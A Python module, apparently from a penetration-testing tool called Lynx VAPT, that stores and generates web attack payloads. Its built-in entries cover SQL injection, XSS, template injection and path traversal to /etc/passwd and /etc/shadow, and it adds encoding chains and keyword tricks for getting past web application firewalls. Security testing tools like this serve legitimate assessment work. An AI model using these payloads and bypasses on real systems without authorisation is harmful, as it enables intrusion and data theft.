"""
Lynx VAPT - Unified Payload Engine

Centralized payload management with:
- Payload tagging (WAF bypass, polymorphic, etc.)
- Multi-layer encoding
- Recursive payload expansion
- Context-aware payload selection
- WAF evasion techniques

Author: Lynx Team
"""

import base64
import html
import json
import random
import re
import string
import urllib.parse
from dataclasses import dataclass, field
from enum import Enum, auto
from typing import Dict, List, Optional, Any, Callable, Set, Iterator
from pathlib import Path


class PayloadTag(Enum):
    """Tags for categorizing payloads."""
    # Attack type
    SQLI = auto()
    XSS = auto()
    SSTI = auto()
    SSRF = auto()
    LFI = auto()
    RCE = auto()
    XXE = auto()
    
    # Characteristics
    WAF_BYPASS = auto()
    OBFUSCATED = auto()
    POLYMORPHIC = auto()
    BLIND = auto()
    TIME_BASED = auto()
    ERROR_BASED = auto()
    UNION_BASED = auto()
    
    # Target
    MYSQL = auto()
    MSSQL = auto()
    POSTGRESQL = auto()
    ORACLE = auto()
    SQLITE = auto()
    
    # Severity
    AGGRESSIVE = auto()
    SAFE = auto()
    DETECTION_ONLY = auto()


class EncodingType(Enum):
    """Encoding types for payload transformation."""
    URL = "url"
    DOUBLE_URL = "double_url"
    HTML = "html"
    BASE64 = "base64"
    HEX = "hex"
    UNICODE = "unicode"
    UTF16 = "utf16"
    CHARCODE = "charcode"
    OCTAL = "octal"
    NULL_BYTE = "null_byte"
    CASE_VARIATION = "case"
    COMMENT_INJECTION = "comment"
    WHITESPACE = "whitespace"


@dataclass
class Payload:
    """A payload with metadata."""
    content: str
    tags: Set[PayloadTag] = field(default_factory=set)
    description: str = ""
    encoding_chain: List[EncodingType] = field(default_factory=list)
    success_indicators: List[str] = field(default_factory=list)
    waf_bypass_level: int = 0  # 0-3, higher = more evasive
    
    def __hash__(self):
        return hash(self.content)


class PayloadEncoder:
    """
    Handles payload encoding and transformation.
    """
    
    @staticmethod
    def url_encode(payload: str) -> str:
        """URL encode a payload."""
        return urllib.parse.quote(payload, safe='')
    
    @staticmethod
    def double_url_encode(payload: str) -> str:
        """Double URL encode a payload."""
        return urllib.parse.quote(urllib.parse.quote(payload, safe=''), safe='')
    
    @staticmethod
    def html_encode(payload: str) -> str:
        """HTML entity encode a payload."""
        return html.escape(payload)
    
    @staticmethod
    def base64_encode(payload: str) -> str:
        """Base64 encode a payload."""
        return base64.b64encode(payload.encode()).decode()
    
    @staticmethod
    def hex_encode(payload: str) -> str:
        """Hex encode a payload."""
        return ''.join(f'%{ord(c):02x}' for c in payload)
    
    @staticmethod
    def unicode_encode(payload: str) -> str:
        """Unicode escape encode."""
        return ''.join(f'\\u{ord(c):04x}' for c in payload)
    
    @staticmethod
    def utf16_encode(payload: str) -> str:
        """UTF-16 encode for XSS."""
        return ''.join(f'%u{ord(c):04x}' for c in payload)
    
    @staticmethod
    def charcode_encode(payload: str) -> str:
        """JavaScript charCode encode."""
        codes = ','.join(str(ord(c)) for c in payload)
        return f"String.fromCharCode({codes})"
    
    @staticmethod
    def octal_encode(payload: str) -> str:
        """Octal encode."""
        return ''.join(f'\\{ord(c):03o}' for c in payload)
    
    @staticmethod
    def null_byte_inject(payload: str) -> str:
        """Add null bytes for WAF bypass."""
        return payload.replace(' ', '%00')
    
    @staticmethod
    def case_variation(payload: str) -> str:
        """Random case variation."""
        return ''.join(
            c.upper() if random.random() > 0.5 else c.lower()
            for c in payload
        )
    
    @staticmethod
    def comment_injection(payload: str, comment_style: str = "sql") -> str:
        """Inject comments for WAF bypass."""
        if comment_style == "sql":
            # Insert /**/ between keywords
            return re.sub(r'(\s+)', r'/**/\1/**/', payload)
        elif comment_style == "html":
            return f"<!-->{payload}<!--"
        return payload
    
    @staticmethod
    def whitespace_obfuscation(payload: str) -> str:
        """Replace spaces with alternative whitespace."""
        alternatives = ['\t', '\n', '\r', '\x0b', '\x0c', '/**/', '+']
        return payload.replace(' ', random.choice(alternatives))
    
    def encode(self, payload: str, encoding: EncodingType) -> str:
        """Apply a single encoding to a payload."""
        encoders = {
            EncodingType.URL: self.url_encode,
            EncodingType.DOUBLE_URL: self.double_url_encode,
            EncodingType.HTML: self.html_encode,
            EncodingType.BASE64: self.base64_encode,
            EncodingType.HEX: self.hex_encode,
            EncodingType.UNICODE: self.unicode_encode,
            EncodingType.UTF16: self.utf16_encode,
            EncodingType.CHARCODE: self.charcode_encode,
            EncodingType.OCTAL: self.octal_encode,
            EncodingType.NULL_BYTE: self.null_byte_inject,
            EncodingType.CASE_VARIATION: self.case_variation,
            EncodingType.COMMENT_INJECTION: self.comment_injection,
            EncodingType.WHITESPACE: self.whitespace_obfuscation,
        }
        
        encoder = encoders.get(encoding)
        if encoder:
            return encoder(payload)
        return payload
    
    def encode_chain(self, payload: str, encodings: List[EncodingType]) -> str:
        """Apply multiple encodings in sequence."""
        result = payload
        for encoding in encodings:
            result = self.encode(result, encoding)
        return result


class WAFBypassGenerator:
    """
    Generates WAF bypass variants for payloads.
    """
    
    # SQL keyword alternatives
    SQL_BYPASSES = {
        'SELECT': ['SeLeCt', 'SELECT/**/'],
        'UNION': ['UNI%0bON', 'UN/**/ION', 'UNION/**/'],
        'FROM': ['FR%0bOM', 'FR/**/OM'],
        'WHERE': ['WH%0bERE', 'WH/**/ERE'],
        'AND': ['AN%0bD', 'A/**/ND', '&&'],
        'OR': ['O%0bR', '||', 'O/**/R'],
        ' ': ['/**/\t/**/', '%09', '%0a', '%0d', '+'],
    }
    
    # XSS alternatives
    XSS_BYPASSES = {
        '<script>': ['<scr<script>ipt>', '<ScRiPt>', '<script/>', '<script\t>'],
        'alert': ['al\\u0065rt', 'prompt', 'confirm', 'alert/**/'],
        'onerror': ['ONERROR', 'onerror=', 'oNeRrOr'],
        'javascript:': ['java&#x09;script:', 'JAVAscript:', 'javascript\t:'],
    }
    
    def generate_sql_bypasses(self, payload: str) -> List[str]:
        """Generate SQL injection WAF bypass variants."""
        variants = [payload]
        
        result = payload
        for keyword, alternatives in self.SQL_BYPASSES.items():
            if keyword in payload.upper():
                for alt in alternatives:
                    variant = re.sub(
                        re.escape(keyword), alt, result, flags=re.IGNORECASE
                    )
                    if variant not in variants:
                        variants.append(variant)
        
        return variants
    
    def generate_xss_bypasses(self, payload: str) -> List[str]:
        """Generate XSS WAF bypass variants."""
        variants = [payload]
        
        for pattern, alternatives in self.XSS_BYPASSES.items():
            if pattern in payload.lower():
                for alt in alternatives:
                    variant = re.sub(
                        re.escape(pattern), alt, payload, flags=re.IGNORECASE
                    )
                    if variant not in variants:
                        variants.append(variant)
        
        # Add encoding variants
        encoder = PayloadEncoder()
        variants.append(encoder.encode(payload, EncodingType.HTML))
        variants.append(encoder.encode(payload, EncodingType.URL))
        
        return variants


class PayloadExpander:
    """
    Recursively expands payload templates.
    """
    
    def __init__(self):
        self.variables: Dict[str, List[str]] = {
            '{QUOTE}': ["'", '"', '`'],
            '{SPACE}': [' ', '%20', '/**/\t/**/', '%09', '+'],
            '{NULL}': ['%00', '\\0', ''],
            '{COMMENT}': ['--', '#', '/*'],
            '{XSS_TAG}': ['script', 'img', 'svg', 'body', 'iframe', 'input'],
            '{XSS_EVENT}': ['onerror', 'onload', 'onclick', 'onmouseover', 'onfocus'],
            '{XSS_FUNC}': ['alert', 'prompt', 'confirm'],
            '{SQL_BOOL}': ['1=1', '2>1', 'true'],
            '{SQL_COMMENT}': ['--+-', '#', '/**/'],
            '{PATH}': ['../', '....///', '..\\', '..%2f'],
            '{FILE}': ['/etc/passwd', '/etc/shadow', 'C:\\Windows\\win.ini'],
        }
    
    def expand(self, template: str, max_variants: int = 100) -> List[str]:
        """
        Expand a payload template into multiple variants.
        
        Example: "'{QUOTE}OR{SPACE}1=1{SQL_COMMENT}" 
        becomes: ["'OR 1=1--", "'OR 1=1#", '"OR%201=1--', ...]
        """
        variants = [template]
        
        for var_name, var_values in self.variables.items():
            if var_name not in template:
                continue
            
            new_variants = []
            for variant in variants:
                if var_name in variant:
                    for value in var_values:
                        new_variant = variant.replace(var_name, value, 1)
                        new_variants.append(new_variant)
                else:
                    new_variants.append(variant)
            
            variants = new_variants[:max_variants]
        
        return variants


class PayloadEngine:
    """
    Unified Payload Engine.
    
    Manages all payloads with tagging, encoding, expansion,
    and WAF bypass generation.
    """
    
    def __init__(self, payloads_dir: str = "payloads"):
        self.payloads_dir = Path(payloads_dir)
        self.payloads: List[Payload] = []
        self.encoder = PayloadEncoder()
        self.waf_bypass = WAFBypassGenerator()
        self.expander = PayloadExpander()
        
        # Load built-in payloads
        self._load_builtin_payloads()
    
    def _load_builtin_payloads(self):
        """Load built-in payloads."""
        # SQL Injection
        self.add_payloads([
            Payload("' OR '1'='1", {PayloadTag.SQLI, PayloadTag.SAFE}),
            Payload("' OR 1=1--", {PayloadTag.SQLI, PayloadTag.MYSQL}),
            Payload("1' AND '1'='1", {PayloadTag.SQLI, PayloadTag.DETECTION_ONLY}),
            Payload("' UNION SELECT NULL--", {PayloadTag.SQLI, PayloadTag.UNION_BASED}),
            Payload("' AND SLEEP(5)--", {PayloadTag.SQLI, PayloadTag.TIME_BASED, PayloadTag.MYSQL}),
            Payload("'; WAITFOR DELAY '0:0:5'--", {PayloadTag.SQLI, PayloadTag.TIME_BASED, PayloadTag.MSSQL}),
        ], success_indicators=["SQL", "syntax", "error", "mysql", "ORA-"])
        
        # XSS
        self.add_payloads([
            Payload("<script>alert(1)</script>", {PayloadTag.XSS, PayloadTag.SAFE}),
            Payload("<img src=x onerror=alert(1)>", {PayloadTag.XSS}),
            Payload("<svg onload=alert(1)>", {PayloadTag.XSS}),
            Payload("javascript:alert(1)", {PayloadTag.XSS}),
            Payload("'-alert(1)-'", {PayloadTag.XSS, PayloadTag.WAF_BYPASS}),
            Payload("<img src=x onerror=alert`1`>", {PayloadTag.XSS, PayloadTag.WAF_BYPASS}),
        ], success_indicators=["<script>", "alert", "onerror"])
        
        # SSTI
        self.add_payloads([
            Payload("{{7*7}}", {PayloadTag.SSTI, PayloadTag.DETECTION_ONLY}),
            Payload("${7*7}", {PayloadTag.SSTI, PayloadTag.DETECTION_ONLY}),
            Payload("{{7*'7'}}", {PayloadTag.SSTI}),
            Payload("#{7*7}", {PayloadTag.SSTI}),
        ], success_indicators=["49", "7777777"])
        
        # LFI
        self.add_payloads([
            Payload("../../../etc/passwd", {PayloadTag.LFI}),
            Payload("..\\..\\..\\windows\\win.ini", {PayloadTag.LFI}),
            Payload("....//....//....//etc/passwd", {PayloadTag.LFI, PayloadTag.WAF_BYPASS}),
            Payload("/etc/passwd%00", {PayloadTag.LFI, PayloadTag.WAF_BYPASS}),
        ], success_indicators=["root:", "[fonts]", "boot loader"])
    
    def add_payload(self, payload: Payload):
        """Add a single payload."""
        if payload not in self.payloads:
            self.payloads.append(payload)
    
    def add_payloads(
        self,
        payloads: List[Payload],
        success_indicators: List[str] = None
    ):
        """Add multiple payloads."""
        for payload in payloads:
            if success_indicators:
                payload.success_indicators = success_indicators
            self.add_payload(payload)
    
    def load_from_file(self, file_path: str, tags: Set[PayloadTag] = None):
        """Load payloads from a file (one per line)."""
        tags = tags or set()
        
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        self.add_payload(Payload(line, tags))
        except Exception:
            pass
    
    def get_payloads(
        self,
        tags: Set[PayloadTag] = None,
        exclude_tags: Set[PayloadTag] = None,
        limit: int = None
    ) -> List[Payload]:
        """
        Get payloads matching the given criteria.
        
        Args:
            tags: Required tags (payload must have at least one)
            exclude_tags: Tags to exclude
            limit: Maximum number of payloads
        """
        tags = tags or set()
        exclude_tags = exclude_tags or set()
        
        result = []
        
        for payload in self.payloads:
            # Check required tags
            if tags and not payload.tags.intersection(tags):
                continue
            
            # Check excluded tags
            if payload.tags.intersection(exclude_tags):
                continue
            
            result.append(payload)
            
            if limit and len(result) >= limit:
                break
        
        return result
    
    def get_encoded(
        self,
        payload: Payload,
        encodings: List[EncodingType]
    ) -> str:
        """Get an encoded version of a payload."""
        return self.encoder.encode_chain(payload.content, encodings)
    
    def get_waf_variants(self, payload: Payload) -> List[str]:
        """Get WAF bypass variants of a payload."""
        if PayloadTag.SQLI in payload.tags:
            return self.waf_bypass.generate_sql_bypasses(payload.content)
        elif PayloadTag.XSS in payload.tags:
            return self.waf_bypass.generate_xss_bypasses(payload.content)
        return [payload.content]
    
    def expand_template(self, template: str, max_variants: int = 50) -> List[str]:
        """Expand a payload template."""
        return self.expander.expand(template, max_variants)
    
    def generate_all_variants(
        self,
        payload: Payload,
        include_encoded: bool = True,
        include_waf_bypass: bool = True,
        max_variants: int = 20
    ) -> List[str]:
        """
        Generate all variants of a payload.
        
        Includes original, encoded, and WAF bypass versions.
        """
        variants = [payload.content]
        
        if include_waf_bypass:
            variants.extend(self.get_waf_variants(payload))
        
        if include_encoded:
            # Add common encodings
            for enc in [EncodingType.URL, EncodingType.DOUBLE_URL, EncodingType.HTML]:
                encoded = self.get_encoded(payload, [enc])
                if encoded not in variants:
                    variants.append(encoded)
        
        return variants[:max_variants]
    
    def iterate_payloads(
        self,
        tags: Set[PayloadTag] = None,
        with_variants: bool = False
    ) -> Iterator[str]:
        """
        Iterate over payloads, optionally with variants.
        
        This is a generator for memory-efficient iteration.
        """
        for payload in self.get_payloads(tags):
            if with_variants:
                for variant in self.generate_all_variants(payload):
                    yield variant
            else:
                yield payload.content


# Global payload engine instance
_payload_engine: Optional[PayloadEngine] = None


def get_payload_engine() -> PayloadEngine:
    """Get the global payload engine."""
    global _payload_engine
    if _payload_engine is None:
        _payload_engine = PayloadEngine()
    return _payload_engine
